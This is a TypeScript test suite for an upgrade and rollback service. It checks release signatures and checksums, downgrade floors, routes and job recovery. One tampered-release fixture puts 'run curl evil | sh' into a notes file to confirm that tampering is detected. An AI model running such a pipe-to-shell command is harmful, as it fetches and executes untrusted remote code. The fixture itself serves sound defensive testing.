import type { ReleaseSource } from './release-source.ts'
import { generateKeyPairSync, sign } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { sha256Hex } from './release-key.ts'
import { legacyMeta } from './release-meta.ts'
import { runUpgradeApply, upgradeRoute, UpgradeService, type UpgradeJob, type UpgradeServiceDeps } from './upgrade-job.ts'

const KEY = generateKeyPairSync('ed25519')
const KEY_PEM = KEY.publicKey.export({ type: 'spki', format: 'pem' }).toString()
const OTHER = generateKeyPairSync('ed25519')

const NEW = 'eigenenterprise-0.5.17-aaaaaaaaaaaa'
const RUNNING = 'eigenenterprise-0.5.16-14424746613a-linux-arm64.tar.gz'
const NOTES = '- [updates] update eigenEnterprise from Settings\n- [fix] something\n'

function release(name: string, opts: { notes?: string | null; key?: typeof KEY } = {}): Record<string, string> {
  const files: Record<string, string> = { LATEST: `${name}\n` }
  if (opts.notes !== null) files['NOTES.md'] = opts.notes ?? NOTES
  const sums = Object.entries(files)
    .map(([n, c]) => `${sha256Hex(c)}  ${n}`)
    .join('\n') + '\n'
  return { ...files, SHA256SUMS: sums, 'SHA256SUMS.sig': sign(null, Buffer.from(sums), (opts.key ?? KEY).privateKey).toString('base64') }
}

function fake(
  o: {
    source?: ReleaseSource | null
    managed?: boolean
    installed?: string | null
    pinned?: Record<string, string>
    newest?: string
    unitActive?: boolean
    busy?: string | null
    launch?: () => Promise<void>
  } = {},
) {
  const disk = new Map<string, string>()
  const events: Array<{ type: string; message: string }> = []
  const launched: string[] = []
  const fetched: string[] = []
  const pinned = o.pinned ?? release(NEW)
  const state = { unitActive: o.unitActive ?? false, installed: o.installed === undefined ? RUNNING : o.installed }
  const rb = {
    onDisk: [RUNNING, BLUE] as string[],
    inactive: null as string | null,
    floor: '0.5.15' as string | null,
    restoreBusy: null as string | null,
    comesBack: true,
    live: 'a'.repeat(16) as string | null,
    switched: [] as string[],
  }
  const deps: UpgradeServiceDeps = {
    readFile: async (p) => disk.get(p) ?? null,
    writeFile: async (p, c) => void disk.set(p, c),
    stateFile: '/var/lib/ee/upgrade.json',
    now: () => new Date('2026-11-18T12:00:00Z'),
    emit: async (type, message) => void events.push({ type, message }),
    settings: async () => ({
      managed: o.managed ?? false,
      releaseSource: o.source === undefined ? { kind: 'github', repo: 'hikaru90/eigen-enterprise' } : o.source,
    }),
    installed: async () => state.installed,
    arch: 'arm64',
    fetchText: async (url) => {
      fetched.push(url)
      if (url === 'https://github.com/hikaru90/eigen-enterprise/releases/latest/download/LATEST') return `${o.newest ?? NEW}\n`
      const m = /^https:\/\/github\.com\/hikaru90\/eigen-enterprise\/releases\/download\/v[\d.]+\/(.+)$/.exec(url) ?? /^\/release\/(.+)$/.exec(url)
      const body = m ? pinned[m[1]!] : undefined
      if (body === undefined) throw new Error(`GET ${url} → 404`)
      return body
    },
    releaseKeyPem: KEY_PEM,
    launch: o.launch ?? (async (id) => void launched.push(id)),
    unitActive: async () => state.unitActive,
    otherBusy: async () => o.busy ?? null,
    lastOutcome: async () => null,
    rollback: {
      arch: 'arm64',
      installed: async () => state.installed,
      osTarballs: async () => [...rb.onDisk],
      inactiveSlotRelease: async () => rb.inactive,
      sha256Of: async (t) => (t.includes('0.5.15') ? 'b' : t.includes('0.5.14') ? 'c' : 'a').repeat(64),
      meta: async (r) => ({ ...legacyMeta(r), downgradeFloor: rb.floor ?? legacyMeta(r).version, legacy: rb.floor === null }),
      restoreBusy: async () => rb.restoreBusy,
      switchOs: async (tarball, sha256, author, message) => {
        rb.switched.push(`${tarball} ${author} ${message}`)
        if (!rb.comesBack) return 'os: the app crashed on start'
        state.installed = tarball
        rb.live = sha256.slice(0, 16)
        return null
      },
      liveOsRelease: async () => rb.live,
    },
  }
  const job = async () => JSON.parse(disk.get('/var/lib/ee/upgrade.json')!).job as UpgradeJob
  return { deps, disk, events, launched, fetched, state, job, rb, svc: new UpgradeService(deps) }
}

/** The release that ran before RUNNING (blue, after the update to RUNNING). */
const BLUE = 'eigenenterprise-0.5.15-bbbbbbbbbbbb-linux-arm64.tar.gz'

describe('ee rollback (plan/phase-upgrades.md §6.4 step 6): blue back live, no restore', () => {
  it('the plan names blue, the one other release kept on disk', async () => {
    expect(await fake().svc.rollbackPlan()).toEqual({ from: RUNNING, to: BLUE, refused: null })
  })

  it('switches os back to blue in the company repo and checks blue is live', async () => {
    const f = fake()
    expect(await f.svc.rollback({ author: 'owner:root' })).toEqual({ from: RUNNING, to: BLUE })
    expect(f.rb.switched).toEqual([`${BLUE} owner:root rollback: os to eigenenterprise-0.5.15-bbbbbbbbbbbb (by owner:root)`])
    expect(f.events.map((e) => e.type)).toEqual(['upgrade.rollback_started', 'upgrade.rolled_back'])
  })

  it('refuses below the downgrade floor of what runs, nothing changed', async () => {
    const f = fake()
    f.rb.floor = '0.5.16'
    await expect(f.svc.rollback({ author: 'owner:root' })).rejects.toThrow(
      'rollback refused, nothing changed: 0.5.15 is below the downgrade floor 0.5.16 of eigenenterprise-0.5.16-14424746613a (it changed what 0.5.15 runs on); going back that far needs a restore from the safety copy',
    )
    expect(f.rb.switched).toEqual([])
  })

  it('a release with no kept metadata (from before U3) is its own floor', async () => {
    const f = fake()
    f.rb.floor = null
    expect((await f.svc.rollbackPlan()).refused).toMatch(/below the downgrade floor 0\.5\.16/)
  })

  it('refuses when no earlier release is on disk, or when it cannot tell which is blue', async () => {
    const none = fake()
    none.rb.onDisk = [RUNNING]
    expect((await none.svc.rollbackPlan()).refused).toMatch(/no earlier release is on this server/)
    const two = fake()
    two.rb.onDisk = [RUNNING, BLUE, 'eigenenterprise-0.5.14-cccccccccccc-linux-arm64.tar.gz']
    expect((await two.svc.rollbackPlan()).refused).toMatch(/more than one earlier release .* say which \(--to\)/)
    two.rb.inactive = 'b'.repeat(16)
    expect((await two.svc.rollbackPlan()).to).toBe(BLUE)
    expect((await two.svc.rollbackPlan('eigenenterprise-0.5.14-cccccccccccc')).refused).toMatch(/below the downgrade floor 0\.5\.15/)
    two.rb.floor = '0.5.14'
    expect((await two.svc.rollbackPlan('eigenenterprise-0.5.14-cccccccccccc')).to).toBe('eigenenterprise-0.5.14-cccccccccccc-linux-arm64.tar.gz')
  })

  it('refuses a "rollback" to a newer release', async () => {
    const f = fake({ installed: BLUE })
    expect((await f.svc.rollbackPlan()).refused).toMatch(/is newer than eigenenterprise-0\.5\.15-bbbbbbbbbbbb: that is an update/)
  })

  it('a person cannot roll back while an update runs or on a managed box; the update itself can (automatic)', async () => {
    const managed = fake({ managed: true })
    await expect(managed.svc.rollback({ author: 'owner:root' })).rejects.toThrow(/managed mode/)
    expect(await managed.svc.rollback({ author: 'ee-upgrade', automatic: true, reason: 'the watch failed' })).toEqual({ from: RUNNING, to: BLUE })
    expect(managed.rb.switched[0]).toContain('(the watch failed)')
  })

  it('refuses while a restore runs', async () => {
    const f = fake()
    f.rb.restoreBusy = 'a restore is running; wait for it to finish'
    await expect(f.svc.rollback({ author: 'ee-upgrade', automatic: true })).rejects.toThrow('a restore is running; wait for it to finish')
  })

  it('blue that does not come back is a loud failure, journalled', async () => {
    const f = fake()
    f.rb.comesBack = false
    await expect(f.svc.rollback({ author: 'owner:root' })).rejects.toThrow(
      'the rollback to eigenenterprise-0.5.15-bbbbbbbbbbbb did not bring it live: os: the app crashed on start',
    )
    expect(f.events.map((e) => e.type)).toEqual(['upgrade.rollback_started', 'upgrade.rollback_failed'])
  })

  it('routes: GET is the plan, POST the rollback; a refusal is a 409 problem reply', async () => {
    const f = fake()
    expect(await upgradeRoute(f.svc, 'GET /v1/upgrade/rollback', async () => null)).toEqual({ status: 200, data: { from: RUNNING, to: BLUE, refused: null } })
    f.rb.onDisk = [RUNNING]
    const r = await upgradeRoute(f.svc, 'POST /v1/upgrade/rollback', async () => ({ author: 'owner:root' }))
    expect(r?.status).toBe(409)
    expect((r?.data as { title: string }).title).toMatch(/^rollback refused, nothing changed: no earlier release/)
  })
})

describe('the upgrade report (§6.4 step 7)', () => {
  const outcome = { release: NEW, from: RUNNING, step: 'rolling-back' as const, ok: false, reason: 'the watch failed', rolledBack: true }

  it('the CLI path reports its end; the daemon journals it with the outcome', async () => {
    const f = fake()
    const events: Array<{ type: string; data: Record<string, unknown> }> = []
    f.deps.emit = async (type, _m, data) => void events.push({ type, data })
    expect(await upgradeRoute(f.svc, 'POST /v1/upgrade/outcome', async () => ({ outcome }))).toEqual({ status: 200, data: { recorded: true } })
    expect(events).toEqual([{ type: 'upgrade.failed', data: expect.objectContaining({ via: 'cli', outcome }) }])
  })

  it('refuses an outcome that is not one', async () => {
    const r = await upgradeRoute(fake().svc, 'POST /v1/upgrade/outcome', async () => ({ outcome: { ...outcome, step: 'whatever' } }))
    expect(r?.status).toBe(400)
  })

  it('the unit records the outcome on the job; the daemon journals it once', async () => {
    const f = fake()
    const events: Array<{ type: string; data: Record<string, unknown> }> = []
    f.deps.emit = async (type, _m, data) => void events.push({ type, data })
    const { job } = await f.svc.start({ release: NEW, author: 'human:u1' })
    await runUpgradeApply(f.deps, job.id, async (hooks) => {
      await hooks.outcome({ ...outcome, step: 'done', ok: true, reason: null, rolledBack: false })
      return `${NEW}-linux-arm64.tar.gz`
    }, () => undefined)
    expect((await f.job()).outcome).toMatchObject({ ok: true, step: 'done' })
    await f.svc.job()
    await f.svc.job()
    expect(events.filter((e) => e.type === 'upgrade.succeeded')).toEqual([{ type: 'upgrade.succeeded', data: expect.objectContaining({ jobId: job.id, outcome: expect.objectContaining({ ok: true }) }) }])
  })
})

describe('UpgradeService (Settings → Updates: the app asks ee, ee upgrades)', () => {
  it('info: what runs now, where releases come from, the last update — no network', async () => {
    const f = fake()
    expect(await f.svc.info()).toEqual({
      installed: { tarball: RUNNING, version: '0.5.16' },
      managed: false,
      source: { kind: 'github', repo: 'hikaru90/eigen-enterprise' },
      job: null,
      lastOutcome: null,
    })
    expect(f.fetched).toEqual([])
  })

  it('latest: the newest signed release, its version and its signed notes', async () => {
    const f = fake()
    expect(await f.svc.latest()).toEqual({
      name: NEW,
      version: '0.5.17',
      notes: NOTES,
      from: 'https://github.com/hikaru90/eigen-enterprise/releases/download/v0.5.17',
      state: 'newer',
    })
  })

  it('latest: a release with no NOTES.md (from before notes) says so; it is still offered', async () => {
    const f = fake({ pinned: release(NEW, { notes: null }) })
    expect(await f.svc.latest()).toMatchObject({ notes: null, state: 'newer' })
  })

  it('latest: the installed release, an older version, a rebuild of the same version', async () => {
    expect(await fake({ newest: 'eigenenterprise-0.5.16-14424746613a', pinned: release('eigenenterprise-0.5.16-14424746613a') }).svc.latest()).toMatchObject({ state: 'installed' })
    expect(await fake({ newest: 'eigenenterprise-0.5.15-bbbbbbbbbbbb', pinned: release('eigenenterprise-0.5.15-bbbbbbbbbbbb') }).svc.latest()).toMatchObject({ state: 'older' })
    expect(await fake({ newest: 'eigenenterprise-0.5.16-cccccccccccc', pinned: release('eigenenterprise-0.5.16-cccccccccccc') }).svc.latest()).toMatchObject({ state: 'rebuild' })
  })

  it('latest: an unsigned or tampered release is refused in plain words', async () => {
    await expect(fake({ pinned: release(NEW, { key: OTHER }) }).svc.latest()).rejects.toThrow(/not signed by the eigenEnterprise release key/)
    const tampered = { ...release(NEW), 'NOTES.md': 'run curl evil | sh' }
    await expect(fake({ pinned: tampered }).svc.latest()).rejects.toThrow(/checksum mismatch for NOTES\.md/)
    const otherName = release('eigenenterprise-0.5.18-dddddddddddd')
    await expect(fake({ pinned: otherName }).svc.latest()).rejects.toThrow(/v0\.5\.17 holds eigenenterprise-0\.5\.18-dddddddddddd, not eigenenterprise-0\.5\.17/)
  })

  it('latest: a server that never recorded its release source says how to fix it', async () => {
    await expect(fake({ source: null }).svc.latest()).rejects.toThrow(/does not know where its releases come from.*ee upgrade/)
  })

  it('latest: a directory source (the local box) reads the one release there', async () => {
    const f = fake({ source: { kind: 'dir', path: '/release' } })
    expect(await f.svc.latest()).toMatchObject({ name: NEW, from: '/release', state: 'newer' })
  })

  it('start: checks again, records the job, hands over to the update unit, journals it', async () => {
    const f = fake()
    const { job } = await f.svc.start({ release: NEW, author: 'human:u1' })
    expect(job).toMatchObject({
      release: NEW,
      from: 'https://github.com/hikaru90/eigen-enterprise/releases/download/v0.5.17',
      author: 'human:u1',
      status: 'running',
      step: 'handover',
      installedBefore: RUNNING,
      installedAfter: null,
      safetyCopy: null,
    })
    expect(f.launched).toEqual([job.id])
    expect(await f.job()).toMatchObject({ id: job.id, status: 'running' })
    expect(f.events.map((e) => e.type)).toEqual(['upgrade.started'])
  })

  it('start: refused on a managed box (the hosting control plane owns its release)', async () => {
    const f = fake({ managed: true })
    await expect(f.svc.start({ release: NEW, author: 'human:u1' })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/hosting provider/) })
    expect(f.launched).toEqual([])
  })

  it('start: refused when the approved release is no longer the newest, or is not newer', async () => {
    await expect(fake({ newest: 'eigenenterprise-0.5.18-dddddddddddd', pinned: release('eigenenterprise-0.5.18-dddddddddddd') }).svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({
      status: 409,
      message: expect.stringMatching(/newest release is now 0\.5\.18/),
    })
    await expect(fake({ installed: `${NEW}-linux-arm64.tar.gz` }).svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/already runs/) })
  })

  it('start: one at a time — not while an update, a restore or a fleet upgrade runs', async () => {
    const f = fake()
    await f.svc.start({ release: NEW, author: 'a' })
    f.state.unitActive = true
    await expect(f.svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/an update is running/) })
    await expect(fake({ busy: 'a restore is running; wait for it to finish' }).svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 409, message: 'a restore is running; wait for it to finish' })
  })

  it('start: the unit failing to start is a plain failure; nothing changed', async () => {
    const f = fake({ launch: async () => Promise.reject(new Error('systemd-run: unit exists')) })
    await expect(f.svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 500, message: expect.stringMatching(/could not start the update.*nothing on this server was changed/) })
    expect(await f.job()).toMatchObject({ status: 'failed' })
  })

  it('after a restart: a dead unit reads as failed (naming the safety copy); a finished update is announced once', async () => {
    const f = fake()
    const { job } = await f.svc.start({ release: NEW, author: 'a' })
    // The unit got as far as the installer, then died.
    const mid = { ...(await f.job()), step: 'installing', safetyCopy: '/var/lib/ee/upgrades/2026-11-18T12-00-00Z' }
    f.disk.set(f.deps.stateFile, JSON.stringify({ version: 1, job: mid }))
    const dead = (await new UpgradeService(f.deps).info()).job!
    expect(dead).toMatchObject({ id: job.id, status: 'failed', announced: true })
    expect(dead.error).toMatch(/stopped before it finished \(at "installing"\).*\/var\/lib\/ee\/upgrades\/2026-11-18T12-00-00Z\/ROLLBACK\.txt/)
    expect(f.events.map((e) => e.type)).toEqual(['upgrade.started', 'upgrade.failed'])

    const g = fake()
    await g.svc.start({ release: NEW, author: 'a' })
    g.disk.set(g.deps.stateFile, JSON.stringify({ version: 1, job: { ...(await g.job()), status: 'succeeded', step: 'done', installedAfter: `${NEW}-linux-arm64.tar.gz` } }))
    await g.svc.info()
    await g.svc.info()
    expect(g.events.map((e) => e.type)).toEqual(['upgrade.started', 'upgrade.succeeded'])
  })

  it('a unit that is still running is left alone', async () => {
    const f = fake()
    await f.svc.start({ release: NEW, author: 'a' })
    f.state.unitActive = true
    expect((await new UpgradeService(f.deps).info()).job).toMatchObject({ status: 'running', step: 'handover' })
  })

  it('control routes: info, latest, start; refusals are problem replies', async () => {
    const f = fake()
    expect(await upgradeRoute(f.svc, 'GET /v1/upgrade', async () => ({}))).toMatchObject({ status: 200, data: { managed: false } })
    expect(await upgradeRoute(f.svc, 'GET /v1/upgrade/latest', async () => ({}))).toMatchObject({ status: 200, data: { latest: { name: NEW } } })
    expect(await upgradeRoute(f.svc, 'POST /v1/upgrade', async () => ({ release: 'nope', author: 'a' }))).toMatchObject({ status: 400 })
    expect(await upgradeRoute(f.svc, 'POST /v1/upgrade', async () => ({ release: NEW, author: 'a' }))).toMatchObject({ status: 202, data: { job: { release: NEW } } })
    expect(await upgradeRoute(fake({ managed: true }).svc, 'POST /v1/upgrade', async () => ({ release: NEW, author: 'a' }))).toMatchObject({ status: 409 })
    expect(await upgradeRoute(fake({ pinned: release(NEW, { key: OTHER }) }).svc, 'GET /v1/upgrade/latest', async () => ({}))).toMatchObject({ status: 502 })
    expect(await upgradeRoute(f.svc, 'GET /v1/status', async () => ({}))).toBeNull()
  })
})

describe('runUpgradeApply (the ee-upgrade.service side)', () => {
  async function handedOver() {
    const f = fake()
    const { job } = await f.svc.start({ release: NEW, author: 'a' })
    return { f, job }
  }

  it('refuses unless that update was checked and handed over by ee', async () => {
    const { f } = await handedOver()
    await expect(runUpgradeApply(f.deps, 'not-this-job', async () => 'x', () => {})).rejects.toThrow(/no update .* is waiting/)
  })

  it('records every step, the installer output and the new release', async () => {
    const { f, job } = await handedOver()
    await runUpgradeApply(
      f.deps,
      job.id,
      async (p) => {
        await p.step('verifying')
        await p.step('safety-copy', '/var/lib/ee/upgrades/x')
        await p.step('installing')
        await p.line('→ first deploy (health-gated)')
        return `${NEW}-linux-arm64.tar.gz`
      },
      () => {},
    )
    const done = await f.job()
    expect(done).toMatchObject({ status: 'succeeded', step: 'done', safetyCopy: '/var/lib/ee/upgrades/x', installedAfter: `${NEW}-linux-arm64.tar.gz`, error: null })
    expect(done.log).toEqual(expect.arrayContaining(['→ first deploy (health-gated)', `✓ updated to ${NEW}`]))
  })

  it('steps and lines arriving together are saved one at a time (the box writes via a temp file + rename)', async () => {
    const { f, job } = await handedOver()
    let inFlight = 0
    const write = f.deps.writeFile
    f.deps.writeFile = async (p, c) => {
      if (++inFlight > 1) throw new Error('two writes of the state file at once')
      await new Promise((r) => setTimeout(r, 2))
      await write(p, c)
      inFlight--
    }
    await runUpgradeApply(
      f.deps,
      job.id,
      async (p) => {
        void p.line('→ newest release')
        void p.line('→ verifying the release signature')
        await Promise.all([p.step('verifying'), p.line('installer output'), p.step('safety-copy', '/var/lib/ee/upgrades/x')])
        return `${NEW}-linux-arm64.tar.gz`
      },
      () => {},
    )
    expect(await f.job()).toMatchObject({ status: 'succeeded', safetyCopy: '/var/lib/ee/upgrades/x' })
    expect((await f.job()).log).toEqual(expect.arrayContaining(['→ newest release', '→ verifying the release signature', 'installer output']))
  })

  it('a failure is recorded with where the safety copy is', async () => {
    const { f, job } = await handedOver()
    await expect(
      runUpgradeApply(
        f.deps,
        job.id,
        async (p) => {
          await p.step('safety-copy', '/var/lib/ee/upgrades/x')
          throw new Error('the installer failed (exit 1)')
        },
        () => {},
      ),
    ).rejects.toThrow(/installer failed/)
    expect(await f.job()).toMatchObject({ status: 'failed', step: 'safety-copy', error: 'the installer failed (exit 1)', safetyCopy: '/var/lib/ee/upgrades/x' })
  })
})
